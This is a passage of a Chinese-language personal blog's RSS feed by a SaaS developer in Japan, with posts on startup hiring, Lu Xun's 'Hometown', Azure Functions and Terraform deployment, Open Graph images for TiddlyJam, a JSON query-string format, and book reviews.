</p></blockquote><p>大厂的面试官使用行业通用的测试题也是为了推卸责任，如果无法招聘到合适的工程师，那也不能指责他，因为整个“行业”都是这样做的。</p><h3 class="">1. 关于解决问题</h3><p>很多工程师都已经发现，几乎所有大厂的测试题基本上都是类似的，即使没有项目经验，背一背测试题基本上也可以应付。不好意思，这种想法在 start-up 是水土不服的。start-up 通常会根据自身业务需求，为候选人量身定制测试项目。</p><p>例如，我们项目在使用的几套 frontend 测试项目。</p><ul><li><a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/react-assignment" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/react-assignment</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/react-assignment-medium" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/react-assignment-medium</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/react-assignment-hard" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/react-assignment-hard</a></li></ul><p>不同的候选人拿到的项目的难度、考察的内容、对结果的要求都是不一样的。一方面，提前接触我司的测试可以帮助候选人了解我们对工程师的期待，不要加入项目才发现项目难度太大无法胜任；</p><h3 class="">2. 关于舒适圈</h3><p>start-up 通常不是一个萝卜一个坑，经常是人手不够的状态。有时候即使不是自己熟悉的领域，也要临阵磨枪，独当一面。</p><p>或许很多人会说，为什么不招聘一个有经验的工程师？首先，当项目需要，并且碰巧有经验的工程师正在找工作，这种机遇是可遇不可求的。另外，即使有候选人，如果你不懂这个领域你也不知道如何面试他。</p><h3 class="">3. 关于产品思维</h3><p>其实在产品经理的圈子里流行一句话：“人人都是产品经理。”</p><p>start-up 中尤其需要这种思维，所以在我司的面试流程中，我们特别期待候选人可以这样自我介绍。</p><ol><li>你参加过哪些项目？你从中扮演什么角色？</li><li>项目背景，项目解决了什么问题？</li><li>你自己做了哪些贡献？</li></ol><p>当然这些都应该建立在诚信的基础上。
有一点想分享给大家，“没吃过猪肉但见过猪跑”在面试环节中是有可能加分的。“只见猪跑就假装吃过猪肉”是一定减分的。</p><p>总结：</p><ol><li>start-up 很难找到合适的的工程师。</li><li>start-up 没有办法使用行业通用的测试题筛选候选人。</li><li>start-up 期待工程师能解决问题、愿意跨出舒适圈、有产品思维。</li></ol><p>祝大家工作顺利，生活愉快。</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 18 October 2021 23:12:40 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-10-18–liao-liao-start-up–xiao-gong-si—zhao-pin-gong-cheng-shi</guid>      
   </item>

   <item>
      <title>2021-08-29 原来鲁迅生活的年代和我们如此相似</title>
      <link>https://thaddeusjiang.com/2021-08-29–yuan-lai-lu-xun-sheng-huo-de-nian-dai-he-wo-men-ru-ci-xiang-si</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-08-29 原来鲁迅生活的年代和我们如此相似</h1>
            <hr>

            <p>读鲁迅的《呐喊》中“故乡”有感。</p><p>这是一篇中学课文，感谢中学教材的编辑们，让我在学生时代能接触到如此优秀的作品。重读《呐喊》中“故乡”这一章，大脑中无数的回忆被唤醒。尤其是</p><blockquote class="tc-quote tc-big-quote"><p>深蓝的天空中挂着一轮黄金的圆月，下面是海边的沙地，都种着一望无际的碧绿的西瓜，其间有一个十一二岁的少年，项着银圈，手捏一柄钢叉，向一匹猹尽力地刺去，那猹却将身一扭，反而从他的胯下逃走了。
</p></blockquote><p>读到这段时，学生时代的回忆像泉眼一样涌现。</p><p>说实话，近年总是有一些人胡乱编造“鲁迅名言”，让我有一点不记得自己对鲁迅的认识了。重读《呐喊》让我回想起鲁迅是谁，鲁迅有哪些文章，鲁迅的文章想表达什么。尤其是《记念刘和珍君》中：</p><blockquote class="tc-quote tc-big-quote"><p>真的猛士，敢于直面惨淡的人生，敢于正视淋漓的鲜血。
</p></blockquote><p>学生时代的我，真的从心里喜欢这个勇敢的作家，试图用笔杆子治疗国人精神的周树人。</p><p>时隔多年，重读鲁迅的作品，依然产生了许多共鸣，尤其是《故乡》中关于闰土和杨二嫂的片段。</p><blockquote class="tc-quote tc-big-quote"><p>闰土的心里有无穷无尽的稀奇事，都是我往常朋友说不知道的。他们不知道一些事，闰土在海边时，他们都和我一样只看见院子里高墙上的四角的天空。
</p></blockquote><p>原来民国时期，中国人也一样盲目的追求应试教育，忽视户外运动，忽视大自然。这是民族的病，是几千年文化不断的副作用。但凡需要不断通过武力去征服天下，或包围国家的民族都不会忽视运动。其中因果，可能要追溯到黄帝和炎帝时期了。</p><blockquote class="tc-quote tc-big-quote"><p>“不认识了么？我还抱过你咧！”</p><p>“完了？真是贵人眼高。”
</p></blockquote><p>😂 </p><p>怎么和21世纪的七大姑八大姨那么像？原来民国时国人已经这么聊天了，看来是遗毒。侧边也说明，“人心不古”真是一句屁话，古人一样差，至少在鲁迅眼里民国时期的人没有高尚到哪里。</p><blockquote class="tc-quote tc-big-quote"><p>“老屋离我愈远了；故乡的山水也都渐渐远离了我，...”
</p></blockquote><p>时代在前进，但是外出求学、发展的人和他们与故乡的故事如此的相似。</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Sun, 5 September 2021 10:34:54 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-08-29–yuan-lai-lu-xun-sheng-huo-de-nian-dai-he-wo-men-ru-ci-xiang-si</guid>      
   </item>

   <item>
      <title>2021-08-18 Deploying Serverless functions to Azure Function App</title>
      <link>https://thaddeusjiang.com/2021-08-18-deploying-serverless-functions-to-azure-function-app</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-08-18 Deploying Serverless functions to Azure Function App</h1>
            <hr>

            <p>Serverless functions 我已经玩的有点烦了，每个项目都用不同的 Cloud，每次都要变化工作流。原本期待一劳永逸的 Serverless Framework 弱的不行，k8s 有感觉是杀鸡用牛刀。难受😣</p><p>算了，不提了，进入正文。</p><p>这一次是 Azure Function App，我想记录一下如何部署 Serverless functions 到 Azure Function App，并支持 Deployment slots 做一下 A/B testing。</p><p>两种方式</p><ol><li>VSCode Extension</li><li>GitHub Actions</li></ol><h4 class="">1. VSCode Extension</h4><p>使用 VSCode Extension 部署 Azure Function App 非常方便，也是我开发时最常用的方式。
VSCode Extension 用法也很简单，这里介绍一点特殊的，官方文档没有教的内容。</p><p>如果你和我一样，打算使用 Deployment slots 做 <code>A/B testing</code>。</p><p>VSCode Extension 的菜单就比较深了</p><p><img src="https://i.gyazo.com/a00e30807af5d3a3f6cd6c402096c8d2.jpg"></p><p>正确的部署菜单</p><p><img src="https://i.gyazo.com/97e914f00f711cbeb9dffc344b997d8b.jpg"></p><h4 class="">2. GitHub Actions</h4><p>由于 MicroSoft 财大气粗，已经将 GitHub 收入麾下，Azure Function App 也支持使用 GitHub Actions 部署。</p><p>Azure Portal UI </p><p><img src="https://i.gyazo.com/be02ad6fc63897f26a5a67fd3b5419a4.jpg"></p><p>不过，很遗憾，只通过 Azure Portal UI 你并不能成功部署你的 functions。除非你编写了一个 <a class="tc-tiddlylink tc-tiddlylink-missing" href="./#hello-world">hello world</a></p><p>估计你也会遇到下面几个问题</p><ol><li><code>Error: package.json not found.</code></li><li><code>Error: Package deployment using ZIP Deploy failed. Refer logs for more details.</code></li><li>HTTP <code>CORS</code></li></ol><p>怎么解决？</p><p>1.  <code>Error: package.json not found.</code></p><p>这个问题，通常是因为你的 serverless functions 并不在根目录（root），你需要在 yaml 文件中配置 <code>package</code></p><pre class="yml hljs"><code>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">'Run Azure Functions Action'</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">Azure/functions-action@v1.3.2</span>
      <span class="hljs-attr">id:</span> <span class="hljs-string">fa</span>
      <span class="hljs-attr">with:</span>
        <span class="hljs-attr">app-name:</span> <span class="hljs-string">'smartcompany-admin'</span>
        <span class="hljs-attr">package:</span> <span class="hljs-string">'./functions'</span></code></pre><p>2.   <code>Error: Package deployment using ZIP Deploy failed. Refer logs for more details.</code></p><p>这个问题，是因为 Azure Function App Deployment 默认是从 Azure Storage 获取源码。而我们选择使用 GitHub。</p><p>你需要删除 Azure Function App 环境变量</p><p><img src="https://i.gyazo.com/bf40ad3c5ef02cb74840ebec66058d3a.jpg"></p><p>3.  HTTP <code>CORS</code></p><p>这是一个非常常见，但很多初级程序员始终搞不清楚的问题。</p><p>解决方案：添加 Allowed Origins</p><p><img src="https://i.gyazo.com/d8096b2ee786c6be7cf39d54da5ae068.jpg"></p><h4 class="">GitHub Actions 如何支持 Deploy slots？</h4><p>你需要在 yaml 文件中配置 <code>slot-name</code></p><pre class="yml hljs"><code>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">'Run Azure Functions Action'</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">Azure/functions-action@v1.3.2</span>
      <span class="hljs-attr">id:</span> <span class="hljs-string">fa</span>
      <span class="hljs-attr">with:</span>
        <span class="hljs-attr">app-name:</span> <span class="hljs-string">'smartcompany-admin'</span>
        <span class="hljs-attr">slot-name:</span> <span class="hljs-string">'dev'</span>
        <span class="hljs-attr">package:</span> <span class="hljs-string">'./functions'</span></code></pre><p>又是一篇笔记。</p><p>最近我负责的项目已经进入发布前的准备阶段，一大堆 <a class="tc-tiddlylink tc-tiddlylink-resolves" href="./#devops">DevOps</a> 的工作要做，团队缺少 DevOps 专家，没有办法只能自己上了。</p><p>还做了一个简单的 service management System，等项目发布了，打算整理一下（移除敏感内容）后开源出来。</p><hr><p>links</p><ul><li><a class="tc-tiddlylink-external" href="https://marketplace.visualstudio.com/items?itemName=ms-azuretools.vscode-azurefunctions" rel="noopener noreferrer" target="_blank">https://marketplace.visualstudio.com/items?itemName=ms-azuretools.vscode-azurefunctions</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 18 August 2021 23:28:37 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-08-18-deploying-serverless-functions-to-azure-function-app</guid>      
   </item>

   <item>
      <title>2021-08-16 Setup og-image for TiddlyJam</title>
      <link>https://thaddeusjiang.com/2021-08-16-setup-og-image-for-tiddlyjam</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-08-16 Setup og-image for TiddlyJam</h1>
            <hr>

            <p>又控制没不住自己，给自己的 TiddlyJam 网站添加了 Open Graph image。
原本使用 TiddlyJam 就是为了不折腾这些花里胡哨的技术，结果还是抵不住诱惑。😮‍💨</p><p>既然已经做了，就把方法分享一下吧。</p><h4 class="">首先，我是用的是 vercel/og-image| 动态生成 Open Graph。</h4><p>不过官方版本尚不支持中文/日文，所以我添加了中文支持。</p><p>Before: 
<img src="https://og-image.vercel.app/2021-08-03%20%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20Terraform%20%E9%85%8D%E7%BD%AE%20Azure%20App%20Service%20Custom%20domains%20and%20Certificate%20Thumbprint?fontSize=50px"></p><p>After: 
<img src="https://og-image-zh.vercel.app/2021-08-03%20%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20Terraform%20%E9%85%8D%E7%BD%AE%20Azure%20App%20Service%20Custom%20domains%20and%20Certificate%20Thumbprint?fontSize=50px"></p><p><a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/og-image/commit/6219fe4eee8f2a831c0c5b375027c0ffa321d295" rel="noopener noreferrer" target="_blank">code</a></p><h4 class="">然后，我修改了 TiddlyJam 的 renderer_base_seotags.tid 和 tiddlyjam_renderer_macros.tid。</h4><p>主要就是将 og:image 设为我部署在 vercel 的 or-image-zh API。</p><pre><code>// renderer_base_seotags.tid

&lt;meta property="og:image" content="`&lt;&lt;get_og_image&gt;&gt;`" /&gt;</code></pre><pre><code>// tiddlyjam_renderer_macros.tid

 \define get_og_image()
https://og-image-zh.vercel.app/&lt;$text text={{{ [&lt;currentTiddler&gt;get[name]else&lt;currentTiddler&gt;] }}} /&gt;
 \end</code></pre><p>相关链接：</p><ul><li><a class="tc-tiddlylink-external" href="https://ogp.me/" rel="noopener noreferrer" target="_blank">https://ogp.me/</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/vercel/og-image" rel="noopener noreferrer" target="_blank">https://github.com/vercel/og-image</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/tiddlyjam" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/tiddlyjam</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 16 August 2021 23:18:54 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-08-16-setup-og-image-for-tiddlyjam</guid>      
   </item>

   <item>
      <title>2021-08-03 如何使用 Terraform 配置 Azure App Service Custom domains and Certificate Thumbprint</title>
      <link>https://thaddeusjiang.com/2021-08-03–ru-he-shi-yong-terraform–pei-zhi-azure-app-service-custom-domains-and-certificate-thumbprint</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-08-03 如何使用 Terraform 配置 Azure App Service Custom domains and Certificate Thumbprint</h1>
            <hr>

            <p>本文想分享一个具体的配置方法，为了照顾对 Azure portal 和 Terraform 不熟悉的朋友，我将使用 UI 和 Code 对比的方式说明。</p><h2 class="">背景</h2><p>我目前在开发一个人才管理（Talent Management）的 SaaS 产品。因为是一个 ToB 产品并且还在初级阶段，所以架构上没有那么复杂。依托云平台的水平扩展能力，我们采用“Single App Service, Multiple Custom domains” 的架构。</p><p>虽然架构很简单，但是本着“自动化一切可以被自动化的工作”的大原则，我还是使用了 Terraform。</p><h2 class="">为什么我想写这篇文章？</h2><p>由于 Terraform 是一个通用工具，为了兼容不同云平台的资源和指令，不可避免的做了一些抽象。但是这种抽象导致了 Terraform 中资源名称和指令并不完全等于云平台（没错，这里就是想说 MicroSoft Azure）的资源名称和指令。</p><p>这种资源名称、指令以及构建流程的差异让不太熟练的我，花了好几个小时阅读官方文档、StackOverflow。而且我也不确定下一次我还能不能记得这些内容。</p><p>所以，我觉得有必要记录下来。</p><h2 class="">正文</h2><p>UI：</p><p><strong>Step 1: 在 DNS Zoon 中配置一个 CNAME 记录</strong></p><p>依次进入 DNS zones &gt; DNS zone 页面，点击 <code>Record set</code>，如图：</p><p>注意：record 应该是 CNAME</p><p><img src="https://i.gyazo.com/fae29a7e16184bdeb71cf3a61287635d.jpg"></p><p><strong>Step 2: 在 App Service 中配置 Custom domain</strong></p><p>依次进入 App Services &gt; App Service &gt; Settings &gt; Custom domains 页面，点击 <code>Add custom domain</code>，如图：</p><p><img src="https://i.gyazo.com/d8278748c0d99abf858988790892c369.jpg"></p><p><strong>Step 3: 为 App Service 的 Custom domain 配置 Certificate Thumbprint</strong></p><p>依次进入 App Services &gt; App Service &gt; Settings &gt; TLS/SSL Settings，点击 <code>Add TSL/SSL binding</code>，如图：</p><p><img src="https://i.gyazo.com/df2953a533eeeea08c58cc9ea7e0d046.jpg"></p><p>Terraform：</p><pre><code>data "azurerm_dns_zone" "app" {
  name                = "thaddeusjiang.work"
  resource_group_name = "thaddeusjiang-dev"
}

# Step 1: 添加 CNAME 记录
resource "azurerm_dns_cname_record" "app" {
  name                = var.subdomain
  zone_name           = data.azurerm_dns_zone.app.name
  resource_group_name = data.azurerm_dns_zone.app.resource_group_name
  ttl                 = 300
  record              = "saas-dev.thaddeusjiang.work"
}

data "azurerm_app_service" "app" {
  name                = "saas-dev"
  resource_group_name = "saas-dev"
}

resource "azurerm_dns_txt_record" "app" {
  name                = "asuid.${azurerm_dns_cname_record.app.name}"
  zone_name           = data.azurerm_dns_zone.app.name
  resource_group_name = data.azurerm_dns_zone.app.resource_group_name
  ttl                 = 300
  record {
    value = data.azurerm_app_service.app.custom_domain_verification_id
  }
}

# Step 2: 添加 Custom domain 
resource "azurerm_app_service_custom_hostname_binding" "app" {
  hostname            = "${var.subdomain}.thaddeusjiang.work"
  app_service_name    = data.azurerm_app_service.app.name
  resource_group_name = data.azurerm_app_service.app.resource_group_name
  depends_on          = [azurerm_dns_txt_record.app]

  # Step 3: TLS/SSL bindings
  ssl_state  = "SniEnabled"
  thumbprint = "6F72D0121F88382D82C336793xxxxxxxxxxxxx"
}</code></pre><p>参考：</p><ul><li><a class="tc-tiddlylink-external" href="https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/dns_cname_record" rel="noopener noreferrer" target="_blank">azurerm_dns_cname_record</a></li><li><a class="tc-tiddlylink-external" href="https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service_custom_hostname_binding" rel="noopener noreferrer" target="_blank">azurerm_app_service_custom_hostname_binding </a></li><li><a class="tc-tiddlylink-external" href="https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service_certificate_binding" rel="noopener noreferrer" target="_blank">azurerm_app_service_certificate_binding</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 3 August 2021 21:38:44 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-08-03–ru-he-shi-yong-terraform–pei-zhi-azure-app-service-custom-domains-and-certificate-thumbprint</guid>      
   </item>

   <item>
      <title>2021-07-12 分享一种无敌好用的 Location:search 的格式</title>
      <link>https://thaddeusjiang.com/2021-07-12–fen-xiang-yi-zhong-wu-di-hao-yong-de-location-search–de-ge-shi</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-07-12 分享一种无敌好用的 Location:search 的格式</h1>
            <hr>

            <blockquote class="tc-quote tc-big-quote"><p>这应该是我第一次提倡 “不使用 Web 标准”。
</p></blockquote><p>本文想讨论一下 Location:search 的格式。</p><p>Location:search 通常被称为 query string 或者 search string，是 W3C 标准。
形如 <code>?q=word&amp;field1=any1&amp;field1=any2</code>。</p><p>现代浏览器提供 URLSearchParams 和 URL.searchParams 两个接口，以方便从查询字符串中解析出查询参数。</p><p>如果你是本文的目标读者，那你一定可以数量使用这两个接口中任意一个。如果你不会用这两个接口，推荐阅读：<a class="tc-tiddlylink-external" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Location/search" rel="noopener noreferrer" target="_blank">https://developer.mozilla.org/zh-CN/docs/Web/API/Location/search</a></p><h2 class="">W3C 标准的 Location:search 格式有哪些问题？</h2><ol><li>顺序无关。形如 <code>?q=a&amp;other=b&amp;q=c</code> 是被允许的</li><li>没有类型。search 只支持字符串，准确地说是 <code>string | string[] | null</code></li><li>对于多值参数，没有统一格式。如 <code>?q=a&amp;q=b</code>、<code>?q=a,b</code>、<code>'q[]=b&amp;q[]=a'</code>、<code>q[1]=b&amp;q[0]=a</code> 效果一致</li></ol><p>在 Typescript 没有如此流行的时代，我没发现 W3C 标准的 Location:search 有什么问题。
但是当我在 Typescript 下处理 search string，我简直快被逼疯了。</p><p>每天我都被太多无聊的问题烦恼，如：</p><ol><li>含有分隔符的数字是允许的吗？如 <code>?price=10,100</code> 到底表示两个 price 分别是 10 和 100，还是一个 price 值为 10100 ？</li><li>如何表示 boolean 值？ <code>?hidden=true</code> vs. <code>hidden=1</code></li><li>API 支持哪一种数组？<code>?q=a&amp;q=b</code>、<code>?q=a,b</code>、<code>'q[]=b&amp;q[]=a'</code> 还是 <code>q[1]=b&amp;q[0]=a</code> ？</li></ol><h2 class="">非标准，但无敌好用的格式</h2><p>因为标准 Location:search 有上面提到的诸多问题，逼迫我们不得不离开标准，另辟蹊径。</p><p>这里我推荐一种无敌好用的格式。</p><blockquote class="tc-quote tc-big-quote"><p>使用 JSON 作为 Location:search，形如：<code>?q={ userIds: [1,2,3], page: 0, pageSize: 20, readOnly: true }</code> 
</p></blockquote><p>虽然我们不能继续使用 URLSearchParams 和 URL.searchParams 解析查询参数，但是 <code>JSON.parse(string)</code> 可以平滑地接棒。更重要的是 JSON.parse() 是支持类型的。</p><h2 class="">今后，我们的代码</h2><p>解析 URL</p><pre class="js hljs"><code><span class="hljs-comment">// URL: https://example.com/featureA?{ userIds: [1,2,3], page: 0, pageSize: 20, readonly: true }</span>
<span class="hljs-keyword">const</span> { userIds, page, pageSize, readonly } = <span class="hljs-built_in">JSON</span>.parse(location.search.string(<span class="hljs-number">1</span>))
<span class="hljs-comment">// userIds: [1,2,3]</span>
<span class="hljs-comment">// page: 0 </span>
<span class="hljs-comment">// pageSize: 20</span>
<span class="hljs-comment">// readonly: true</span></code></pre><p>追加参数到 URL</p><pre class="js hljs"><code><span class="hljs-keyword">const</span> params = { <span class="hljs-attr">userIds</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>], <span class="hljs-attr">page</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">pageSize</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">readonly</span>: <span class="hljs-literal">true</span> }
location.replace(<span class="hljs-string">`/featureA?<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(params)}</span>`</span>)
<span class="hljs-comment">// URL: https://example.com/featureA?{ userIds: [1,2,3], page: 0, pageSize: 20, readonly: true }</span></code></pre><p>简单又好用对吧？</p><p>其实我也是刚刚学会这个方法，因为太喜欢了，迫不及待地想和大家分享。
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 12 July 2021 23:21:35 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-07-12–fen-xiang-yi-zhong-wu-di-hao-yong-de-location-search–de-ge-shi</guid>      
   </item>

   <item>
      <title>2021-07-03 《有钱人和你想的不一样》美式成功学让人讨厌不起来</title>
      <link>https://thaddeusjiang.com/2021-07-03—you-qian-ren-he-ni-xiang-de-bu-yi-yang–mei-shi-cheng-gong-xue-rang-ren-tao-yan-bu-qi-lai</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-07-03 《有钱人和你想的不一样》美式成功学让人讨厌不起来</h1>
            <hr>

            <p>其实我不讨厌美式成功学。不论它有没有作用，最起码它在教人们采取积极的，正面的行动；而不是教人们旁门左道，损人利己。</p><p>我很喜欢书中提到的“财富蓝图”的概念，如果你也读过《富爸爸穷爸爸》、《小狗钱钱》等关于财富的书籍，你会发现它们都提到了一件事，即思维决定行动、行动决定结果。引用书中的一段话：</p><blockquote class="tc-quote tc-big-quote"><p>“如果你瞄准的是星星，那么至少你会射中月亮。”没钱的人连自己家的天花板都不瞄准，居然还怀疑为什么无法成功。
</p><cite>《有钱人和你想的不一样》</cite></blockquote><p>书中提到几点有钱人和没钱的人的想法上的区别，我觉得对我有警示作用。</p><ol><li>有钱人想得很大。没钱的人想得很小。</li><li>有其人乐意宣传自己和自己的价值观。没钱的人把推销和宣传看成不好的事。</li><li>有钱人选择根据结果拿酬劳。没钱的人选择根据时间拿酬劳。</li></ol><p>如果你也读了这本书，对书中某些观点并不认同，请不要全篇否定这本书。莎士比亚说：“一千个观众眼中有一千个哈姆雷特。”</p><p>最后，我想和大家分享一下书中一个很有意思的故事。</p><blockquote class="tc-quote tc-big-quote"><p>有一个男人走到悬崖边上，突然失去了平衡，滑了一跤，摔下悬崖。但是他很幸运地抓住了崖壁，为了保命只好悬挂在那里。挂着挂着，他终于喊了出来：“上面有人吗？救救我吧！”但是没有回应，他继续呼喊：“上面有人吗？救救我吧！”终于，有一个洪亮的声音回答他：“我是上帝，我可以帮助你。你把手放开，要完全相信我。”然后你听到这个男人依然在喊：“上面有人吗？救救我吧。”
</p></blockquote><p>这个故事很有意思。有一个声音说他是上帝，他让你放手，你放不放？对于这个故事，我也没有明确的答案，毕竟我不是那个挂在悬崖上的男人，我只是躺在自己的床上在读故事。但是作者给出了一个“高大上的”总结，他说：这个故事的道理很简单：如果你想往上升到更高的生命层次，就必须放弃一些旧的思考和存在方式。</p><p>可能是我层次太低，我心里觉得这个总结有点怪怪的。你怎么看？</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Sat, 3 July 2021 15:52:55 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-07-03—you-qian-ren-he-ni-xiang-de-bu-yi-yang–mei-shi-cheng-gong-xue-rang-ren-tao-yan-bu-qi-lai</guid>      
   </item>

   <item>
      <title>2021-06-13 《SaaS创业路线图》相见恨晚的创业指导手册</title>
      <link>https://thaddeusjiang.com/2021-06-13–saas-chuang-ye-lu-xian-tu–xiang-jian-hen-wan-de-chuang-ye-zhi-dao-shou-ce</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-06-13 《SaaS创业路线图》相见恨晚的创业指导手册</h1>
            <hr>

            <p>我曾经有一段短暂的创业经历，那时候的我，真的是把创业想得太简单了。</p><p>朋友给我推荐了这本书，读过以后觉得相见恨晚。</p><p>我曾经有一段短暂的创业经历，2018～2019 我和另外 3 名同样在日本的外国工程师，加上 2 名日本人一起组成了一个  6 个人的小团队，开发了一个专注国际物流的 SaaS 服务 Zenport。</p><p>当时的我单纯地以为只要聚集最优秀的工程师，开发出优秀的产品就能得到客户的青睐，轻轻松松拿单子。</p><p>虽然在 2019 年下半年，我们就已经意识到自己的不足，并果然止损。但是实话实说，我说不清楚我们到底错在哪。阅读了《SaaS 创业路线图》后，让我对当时的团队有了更清楚的认知。</p><h2 class="">《SaaS 创业路线图》让我改变了几个我一直坚信的观点</h2><ol><li>提供免费试用，减少客户的采购成本。</li><li>小微企业采购流程简单，签约快，是重点对象。</li><li>好产品，客户就会一直续费。</li></ol><h2 class="">1. 对于企业来说，没有免费的产品</h2><p>过去我一直认为创业公司为了获得客户，最开始就应该让客户免费使用产品。 客户连用都没用过产品就让客户掏钱，太异想天开了。
本书提出了截然相反的观点：“SaaS 产品不应该免费”。</p><p>理由：</p><p>客户企业采购一个 SaaS 产品，除了采购成本，还有决策成本和培训成本。对企业来说，并不存在“免费的产品”。
